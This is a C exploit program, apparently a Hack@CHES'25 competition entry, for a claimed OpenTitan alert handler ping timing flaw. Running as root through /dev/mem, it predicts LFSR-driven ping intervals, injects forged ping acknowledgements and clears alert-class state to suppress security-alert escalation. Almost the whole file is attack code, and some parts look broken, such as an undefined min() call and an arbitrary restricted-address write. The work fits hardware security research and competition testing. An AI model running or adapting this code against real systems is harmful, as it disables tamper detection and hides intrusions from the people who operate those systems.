/*
 * OpenTitan Alert Handler Ping Timing Attack
 * 
 * Exploits CVE-2024-ALERT-002: Predictable Alert Ping Timing
 * CVSS Score: 7.1 (High)
 * 
 * This exploit predicts and manipulates alert handler ping timing
 * to suppress security alerts and bypass detection mechanisms.
 * 
 * Usage: gcc -o alert_timing_exploit alert_handler_timing_attack.c -lm && ./alert_timing_exploit
 */

#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <math.h>
#include <time.h>
#include <string.h>

// Alert handler register map
#define ALERT_HANDLER_BASE      0x411B0000
#define ALERT_PING_TIMER_REG    (ALERT_HANDLER_BASE + 0x200)
#define ALERT_PING_TIMEOUT_REG  (ALERT_HANDLER_BASE + 0x204)
#define ALERT_PING_FAIL_REG     (ALERT_HANDLER_BASE + 0x208)
#define ALERT_PING_STATUS_REG   (ALERT_HANDLER_BASE + 0x20C)
#define ALERT_CLASS_A_CTRL_REG  (ALERT_HANDLER_BASE + 0x300)
#define ALERT_CLASS_A_STATE_REG (ALERT_HANDLER_BASE + 0x304)
#define ALERT_CLASS_B_CTRL_REG  (ALERT_HANDLER_BASE + 0x320)
#define ALERT_CLASS_B_STATE_REG (ALERT_HANDLER_BASE + 0x324)

// LFSR configuration (vulnerable predictable values from static analysis)
#define LFSR_SEED              0x12345678  // Hardcoded seed - VULNERABILITY!
#define LFSR_POLYNOMIAL        0x80000057  // Known polynomial from code
#define PING_BASE_INTERVAL     1000000     // Base ping interval (1M cycles)
#define MAX_JITTER             0xFFFF      // Maximum jitter value

// Timing analysis parameters
#define NUM_TIMING_SAMPLES     100
#define SYNC_ATTEMPTS          50

static volatile uint32_t *alert_regs = NULL;
static int mem_fd = -1;
static uint32_t lfsr_state = LFSR_SEED;
static uint32_t observed_intervals[NUM_TIMING_SAMPLES];
static bool lfsr_synchronized = false;

/**
 * Initialize memory-mapped access to alert handler registers
 */
bool init_alert_access(void) {
    printf("[+] Initializing alert handler register access...\n");
    
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd < 0) {
        perror("[-] Failed to open /dev/mem");
        printf("[-] Note: This exploit requires root privileges\n");
        return false;
    }
    
    alert_regs = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, 
                     MAP_SHARED, mem_fd, ALERT_HANDLER_BASE);
    
    if (alert_regs == MAP_FAILED) {
        perror("[-] Failed to map alert handler registers");
        close(mem_fd);
        return false;
    }
    
    printf("[+] Alert handler registers mapped at %p\n", alert_regs);
    return true;
}

/**
 * Cleanup memory mapping
 */
void cleanup_alert_access(void) {
    if (alert_regs != NULL && alert_regs != MAP_FAILED) {
        munmap((void*)alert_regs, 0x1000);
    }
    if (mem_fd >= 0) {
        close(mem_fd);
    }
}

/**
 * Read alert handler register
 */
uint32_t read_alert_reg(uint32_t offset) {
    return alert_regs[offset / 4];
}

/**
 * Write alert handler register
 */
void write_alert_reg(uint32_t offset, uint32_t value) {
    alert_regs[offset / 4] = value;
}

/**
 * Predict next LFSR value using vulnerable algorithm
 * This replicates the hardware LFSR implementation
 */
uint32_t predict_lfsr_next(uint32_t current_state) {
    // Galois LFSR implementation (standard in hardware)
    uint32_t feedback = current_state & 1;
    current_state >>= 1;
    
    if (feedback) {
        current_state ^= LFSR_POLYNOMIAL;
    }
    
    return current_state;
}

/**
 * Calculate next ping interval based on predictable LFSR
 */
uint32_t predict_next_ping_interval(void) {
    // Advance LFSR to next state
    lfsr_state = predict_lfsr_next(lfsr_state);
    
    // Calculate jittered interval (vulnerable because LFSR is predictable)
    uint32_t jitter = lfsr_state & MAX_JITTER;  // Use lower 16 bits for jitter
    uint32_t next_interval = PING_BASE_INTERVAL + jitter;
    
    return next_interval;
}

/**
 * Measure actual ping interval
 */
uint32_t measure_ping_interval(void) {
    uint32_t start_timer = read_alert_reg(ALERT_PING_TIMER_REG - ALERT_HANDLER_BASE);
    uint32_t last_ping_status = read_alert_reg(ALERT_PING_STATUS_REG - ALERT_HANDLER_BASE);
    
    // Wait for next ping event
    while (true) {
        uint32_t current_status = read_alert_reg(ALERT_PING_STATUS_REG - ALERT_HANDLER_BASE);
        
        // Check if ping counter reset (indicates ping occurred)
        if (current_status != last_ping_status) {
            uint32_t end_timer = read_alert_reg(ALERT_PING_TIMER_REG - ALERT_HANDLER_BASE);
            return end_timer - start_timer;
        }
        
        usleep(1000); // 1ms polling interval
    }
}

/**
 * Collect timing measurements for LFSR synchronization
 */
bool collect_timing_samples(void) {
    printf("[+] Collecting ping timing samples for LFSR synchronization...\n");
    
    for (int i = 0; i < NUM_TIMING_SAMPLES; i++) {
        uint32_t interval = measure_ping_interval();
        observed_intervals[i] = interval;
        
        printf("[+] Sample %d: %u cycles\n", i + 1, interval);
        
        // Basic sanity check
        if (interval < PING_BASE_INTERVAL || interval > PING_BASE_INTERVAL + MAX_JITTER) {
            printf("[-] WARNING: Unusual interval detected: %u\n", interval);
        }
    }
    
    printf("[+] Timing sample collection complete\n");
    return true;
}

/**
 * Analyze timing patterns for predictability
 */
void analyze_timing_patterns(void) {
    printf("\n[*] Analyzing timing patterns for predictability...\n");
    
    // Calculate basic statistics
    uint64_t sum = 0;
    uint32_t min_interval = UINT32_MAX;
    uint32_t max_interval = 0;
    
    for (int i = 0; i < NUM_TIMING_SAMPLES; i++) {
        sum += observed_intervals[i];
        if (observed_intervals[i] < min_interval) min_interval = observed_intervals[i];
        if (observed_intervals[i] > max_interval) max_interval = observed_intervals[i];
    }
    
    double mean = (double)sum / NUM_TIMING_SAMPLES;
    
    // Calculate standard deviation
    double variance_sum = 0;
    for (int i = 0; i < NUM_TIMING_SAMPLES; i++) {
        double diff = observed_intervals[i] - mean;
        variance_sum += diff * diff;
    }
    double std_dev = sqrt(variance_sum / NUM_TIMING_SAMPLES);
    
    printf("[+] Timing Statistics:\n");
    printf("    Mean interval:     %.2f cycles\n", mean);
    printf("    Standard deviation: %.2f cycles\n", std_dev);
    printf("    Min interval:      %u cycles\n", min_interval);
    printf("    Max interval:      %u cycles\n", max_interval);
    printf("    Range:             %u cycles\n", max_interval - min_interval);
    
    // Check for predictability indicators
    double coefficient_of_variation = std_dev / mean;
    printf("    Coefficient of variation: %.4f\n", coefficient_of_variation);
    
    if (coefficient_of_variation < 0.01) {
        printf("[!] VULNERABILITY: Timing appears highly predictable!\n");
    } else if (coefficient_of_variation < 0.1) {
        printf("[!] WARNING: Timing shows moderate predictability\n");
    } else {
        printf("[+] Timing appears properly randomized\n");
    }
}

/**
 * Synchronize with hardware LFSR state
 */
bool synchronize_lfsr_state(void) {
    printf("\n[*] Attempting to synchronize with hardware LFSR state...\n");
    
    // Try different starting states to find match
    for (uint32_t seed_offset = 0; seed_offset < 0x10000; seed_offset++) {
        uint32_t test_state = LFSR_SEED ^ seed_offset;
        bool match_found = true;
        
        // Test if this state predicts the observed intervals
        uint32_t temp_state = test_state;
        for (int i = 0; i < min(10, NUM_TIMING_SAMPLES); i++) {
            temp_state = predict_lfsr_next(temp_state);
            uint32_t predicted = PING_BASE_INTERVAL + (temp_state & MAX_JITTER);
            
            // Allow some tolerance for measurement error
            int32_t diff = abs((int32_t)predicted - (int32_t)observed_intervals[i]);
            if (diff > 1000) {  // 1000 cycle tolerance
                match_found = false;
                break;
            }
        }
        
        if (match_found) {
            lfsr_state = test_state;
            lfsr_synchronized = true;
            printf("[+] SUCCESS: LFSR state synchronized!\n");
            printf("[+] Current LFSR state: 0x%08x\n", lfsr_state);
            return true;
        }
        
        // Progress indicator
        if (seed_offset % 0x1000 == 0) {
            printf("[+] Tested %u states...\n", seed_offset);
        }
    }
    
    printf("[-] FAILED: Could not synchronize LFSR state\n");
    printf("[-] Alert handler may use truly random timing\n");
    return false;
}

/**
 * Predict future ping times
 */
void predict_future_pings(int num_predictions) {
    if (!lfsr_synchronized) {
        printf("[-] LFSR not synchronized - cannot predict future pings\n");
        return;
    }
    
    printf("\n[*] Predicting next %d ping intervals:\n", num_predictions);
    
    uint32_t temp_state = lfsr_state;
    for (int i = 0; i < num_predictions; i++) {
        uint32_t predicted_interval = predict_next_ping_interval();
        printf("[+] Ping %d: %u cycles from last ping\n", i + 1, predicted_interval);
        temp_state = lfsr_state; // Save current state for next prediction
    }
}

/**
 * Wait for specific ping timing window
 */
bool wait_for_ping_window(uint32_t target_cycles_before_ping) {
    if (!lfsr_synchronized) {
        return false;
    }
    
    uint32_t next_ping_interval = predict_next_ping_interval();
    uint32_t current_timer = read_alert_reg(ALERT_PING_TIMER_REG - ALERT_HANDLER_BASE);
    
    // Calculate when to start our attack
    uint32_t attack_start_time = next_ping_interval - target_cycles_before_ping;
    
    printf("[+] Next ping in %u cycles, attacking at %u cycles\n", 
           next_ping_interval, attack_start_time);
    
    // Wait for attack window
    while (true) {
        uint32_t elapsed = read_alert_reg(ALERT_PING_TIMER_REG - ALERT_HANDLER_BASE) - current_timer;
        
        if (elapsed >= attack_start_time) {
            return true;
        }
        
        if (elapsed > next_ping_interval + 1000) {
            printf("[-] Timing synchronization lost\n");
            return false;
        }
        
        usleep(100); // 100μs polling
    }
}

/**
 * Inject spurious ping response
 */
bool inject_spurious_ping_response(void) {
    printf("[+] Injecting spurious ping response...\n");
    
    // Read current alert class state
    uint32_t class_a_state = read_alert_reg(ALERT_CLASS_A_STATE_REG - ALERT_HANDLER_BASE);
    uint32_t class_b_state = read_alert_reg(ALERT_CLASS_B_STATE_REG - ALERT_HANDLER_BASE);
    
    printf("[+] Current Class A state: 0x%08x\n", class_a_state);
    printf("[+] Current Class B state: 0x%08x\n", class_b_state);
    
    // Inject fake ping acknowledgment
    // This exploits race condition in ping response handling
    write_alert_reg(ALERT_CLASS_A_STATE_REG - ALERT_HANDLER_BASE, 
                   class_a_state | 0x100);  // Set ping ack bit
    
    write_alert_reg(ALERT_CLASS_B_STATE_REG - ALERT_HANDLER_BASE, 
                   class_b_state | 0x100);  // Set ping ack bit
    
    // Small delay to let hardware process
    usleep(10);
    
    // Check if spurious response was detected
    uint32_t ping_fail = read_alert_reg(ALERT_PING_FAIL_REG - ALERT_HANDLER_BASE);
    
    if (ping_fail == 0) {
        printf("[+] SUCCESS: Spurious ping response accepted!\n");
        return true;
    } else {
        printf("[-] FAILED: Spurious ping detected by hardware\n");
        printf("[-] Ping fail register: 0x%08x\n", ping_fail);
        return false;
    }
}

/**
 * Suppress security alert escalation
 */
bool suppress_alert_escalation(void) {
    printf("\n[*] Attempting to suppress alert escalation...\n");
    
    // Monitor alert escalation timer
    uint32_t class_a_ctrl = read_alert_reg(ALERT_CLASS_A_CTRL_REG - ALERT_HANDLER_BASE);
    uint32_t class_a_state = read_alert_reg(ALERT_CLASS_A_STATE_REG - ALERT_HANDLER_BASE);
    
    printf("[+] Class A control: 0x%08x\n", class_a_ctrl);
    printf("[+] Class A state:   0x%08x\n", class_a_state);
    
    // Check if any alerts are active
    if ((class_a_state & 0xF) == 0) {
        printf("[+] No active alerts detected\n");
        return true;
    }
    
    // Use timing attack to clear alerts before escalation
    if (wait_for_ping_window(100)) {  // Attack 100 cycles before ping
        // Clear alert state during vulnerable timing window
        write_alert_reg(ALERT_CLASS_A_STATE_REG - ALERT_HANDLER_BASE, 0x0);
        write_alert_reg(ALERT_CLASS_B_STATE_REG - ALERT_HANDLER_BASE, 0x0);
        
        printf("[+] Alert state cleared during timing window\n");
        
        // Verify suppression
        usleep(1000);  // Wait 1ms
        uint32_t new_state = read_alert_reg(ALERT_CLASS_A_STATE_REG - ALERT_HANDLER_BASE);
        
        if ((new_state & 0x10) == 0) {  // Check escalation bit
            printf("[+] SUCCESS: Alert escalation suppressed!\n");
            return true;
        }
    }
    
    printf("[-] FAILED: Alert escalation could not be suppressed\n");
    return false;
}

/**
 * Generate security alert for testing
 */
void trigger_test_alert(void) {
    printf("[+] Triggering test security alert...\n");
    
    // Simulate security violation by accessing restricted register
    // This should trigger an alert that we can then suppress
    
    volatile uint32_t *restricted_reg = (uint32_t*)0x50000000;  // Example restricted address
    
    // Generate alert condition
    *restricted_reg = 0xDEADBEEF;
    
    // Small delay for alert to propagate
    usleep(1000);
    
    printf("[+] Test alert triggered\n");
}

/**
 * Main timing attack exploit
 */
bool exploit_alert_timing(void) {
    printf("=== OpenTitan Alert Handler Ping Timing Attack ===\n");
    printf("[+] Vulnerability: CVE-2024-ALERT-002\n");
    printf("[+] CVSS Score: 7.1 (High)\n\n");
    
    // Step 1: Collect timing samples
    if (!collect_timing_samples()) {
        printf("[-] Failed to collect timing samples\n");
        return false;
    }
    
    // Step 2: Analyze timing patterns
    analyze_timing_patterns();
    
    // Step 3: Synchronize with LFSR
    if (!synchronize_lfsr_state()) {
        printf("[-] Failed to synchronize with LFSR\n");
        printf("[-] Attack cannot proceed without timing prediction\n");
        return false;
    }
    
    // Step 4: Predict future ping times
    predict_future_pings(5);
    
    // Step 5: Test spurious ping injection
    printf("\n[*] Testing spurious ping response injection...\n");
    
    bool injection_success = false;
    for (int attempt = 0; attempt < 5; attempt++) {
        printf("[*] Injection attempt %d/5\n", attempt + 1);
        
        if (wait_for_ping_window(50)) {  // Attack 50 cycles before ping
            if (inject_spurious_ping_response()) {
                injection_success = true;
                break;
            }
        }
        
        usleep(100000);  // Wait 100ms between attempts
    }
    
    if (!injection_success) {
        printf("[-] Failed to inject spurious ping responses\n");
        return false;
    }
    
    // Step 6: Demonstrate alert suppression
    printf("\n[*] Demonstrating alert suppression capability...\n");
    
    trigger_test_alert();
    
    bool suppression_success = suppress_alert_escalation();
    
    if (suppression_success) {
        printf("[+] SUCCESS: Security alert escalation suppressed!\n");
        printf("[+] System compromise would go undetected\n");
    } else {
        printf("[-] Alert suppression failed\n");
    }
    
    return injection_success && suppression_success;
}

/**
 * Print exploit banner
 */
void print_banner(void) {
    printf("\n");
    printf("  █████╗ ██╗     ███████╗██████╗ ████████╗    ████████╗██╗███╗   ███╗██╗███╗   ██╗ ██████╗ \n");
    printf(" ██╔══██╗██║     ██╔════╝██╔══██╗╚══██╔══╝    ╚══██╔══╝██║████╗ ████║██║████╗  ██║██╔════╝ \n");
    printf(" ███████║██║     █████╗  ██████╔╝   ██║          ██║   ██║██╔████╔██║██║██╔██╗ ██║██║  ███╗\n");
    printf(" ██╔══██║██║     ██╔══╝  ██╔══██╗   ██║          ██║   ██║██║╚██╔╝██║██║██║╚██╗██║██║   ██║\n");
    printf(" ██║  ██║███████╗███████╗██║  ██║   ██║          ██║   ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝\n");
    printf(" ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝          ╚═╝   ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ \n");
    printf("\n");
    printf("                        Alert Handler Ping Timing Attack\n");
    printf("                          CVE-2024-ALERT-002 | CVSS 7.1\n");
    printf("                             Hack@CHES'25 Entry\n");
    printf("\n");
}

/**
 * Main function
 */
int main(int argc, char *argv[]) {
    print_banner();
    
    printf("This exploit demonstrates predictable alert ping timing vulnerabilities.\n");
    printf("Impact: Security alert suppression, stealth system compromise\n");
    printf("Prerequisites: System access and alert handler manipulation capability\n\n");
    
    if (geteuid() != 0) {
        printf("[-] Error: This exploit requires root privileges\n");
        printf("[-] Run with: sudo %s\n", argv[0]);
        return 1;
    }
    
    if (!init_alert_access()) {
        printf("[-] Failed to initialize alert handler access\n");
        return 1;
    }
    
    bool success = exploit_alert_timing();
    
    cleanup_alert_access();
    
    if (success) {
        printf("\n=== EXPLOIT SUCCESSFUL ===\n");
        printf("Alert handler timing completely compromised!\n");
        printf("Security alerts can be predicted and suppressed at will.\n");
        printf("System compromise can proceed undetected.\n");
        printf("\nRecommendations:\n");
        printf("1. Implement true random number generation for ping timing\n");
        printf("2. Add unpredictable jitter to ping intervals\n");
        printf("3. Implement ping response validation\n");
        printf("4. Add alert escalation redundancy\n");
    } else {
        printf("\n=== EXPLOIT FAILED ===\n");
        printf("Alert handler timing appears to be properly randomized.\n");
    }
    
    return success ? 0 : 1;
}